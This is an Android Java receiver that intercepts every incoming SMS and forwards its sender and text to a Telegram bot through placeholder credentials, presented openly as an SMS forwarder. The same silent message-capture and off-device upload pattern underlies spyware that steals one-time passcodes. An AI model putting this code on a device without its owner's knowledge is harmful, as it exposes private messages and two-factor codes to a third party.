package com.yourpackage.smsforward;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import okhttp3.*;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                    String sender = msg.getOriginatingAddress();
                    String body = msg.getMessageBody();
                    sendToTelegram(sender, body);
                }
            }
        }
    }

    private void sendToTelegram(String sender, String body) {
        try {
            OkHttpClient client = new OkHttpClient();
            String url = "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage";
            RequestBody form = new FormBody.Builder()
                    .add("chat_id", "YOUR_CHAT_ID")
                    .add("text", "SMS from " + sender + ":\n" + body)
                    .build();
            Request request = new Request.Builder().url(url).post(form).build();
            client.newCall(request).execute();
        } catch (Exception e) { /* ignore */ }
    }
}
